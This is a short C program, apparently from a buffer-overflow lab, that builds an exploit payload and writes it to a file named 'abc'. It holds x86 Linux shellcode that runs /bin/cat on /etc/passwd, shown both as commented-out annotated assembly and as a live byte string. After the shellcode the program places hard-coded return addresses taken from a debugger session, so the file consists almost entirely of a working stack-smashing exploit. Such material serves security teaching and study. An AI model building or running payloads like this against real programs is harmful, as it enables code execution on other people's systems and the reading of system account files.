#include <stdio.h>
#include <string.h>

/*
const char shellcode[]="\x31\xc0" // xorl %eax,%eax
"\x99" // cdq
"\x52" // push edx
"\x68\x2f\x63\x61\x74" // push dword 0x7461632f
"\x68\x2f\x62\x69\x6e" // push dword 0x6e69622f
"\x89\xe3" // mov ebx,esp
"\x52" // push edx
"\x68\x73\x73\x77\x64" // pu sh dword 0x64777373
"\x68\x2f\x2f\x70\x61" // push dword 0x61702f2f
"\x68\x2f\x65\x74\x63" // push dword 0x6374652f
"\x89\xe1" // mov ecx,esp
"\xb0\x0b" // mov $0xb,%al
"\x52" // push edx
"\x51" // push ecx
"\x53" // push ebx
"\x89\xe1" // mov ecx,esp
"\xcd\x80" ; // int 80h
*/

const unsigned char shellcode[]="\xeb\x1f\x5b\x31\xc0\x88\x43\x0b\x88\x43\x18\x89\x5b\x19\x8d\x4b\x0c\x89\x4b\x1d\x89\x43\x21\xb0\x0b\x8d\x4b\x19\x8d\x53\x21\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x2f\x2f\x2f\x62\x69\x6e\x2f\x63\x61\x74\x23\x2f\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x23\x41\x4a\x49\x54\x48\x41\x4a\x49\x54\x48\x4b\x50";

int main() {
  int i;
  unsigned char buf[100]; //must use unsigned char due to sign extension 
  FILE *fp;

  memset(buf ,'a', 100);
//  memcpy(buf, shellcode, 75);

printf("\n shellcode[0-74]=\n"); for (i=0; i<75;i++){printf("%02x ",shellcode[i]);}

for (i=0; i<75;i++){buf[i]=shellcode[i];}
printf("\n buf[0-74]=\n"); for (i=0; i<75;i++){printf("%02x ",buf[i]);}

  *((unsigned*)(&buf[88])) = 0xffffdb68;  // put x/1xw $ebp from proc_input here, where 88 = $ebp - &buf
  *((unsigned*)(&buf[92])) = 0xffffda50;  // put &buf from proc_input here, where 92 = $ebp -&buf +4

printf("\n buf[88-99]=\n"); for (i=88; i<100;i++){printf("%02x ",buf[i]);}

  fp = fopen("abc", "w");
  fwrite(buf, 1, 100, fp);

  fclose(fp);
}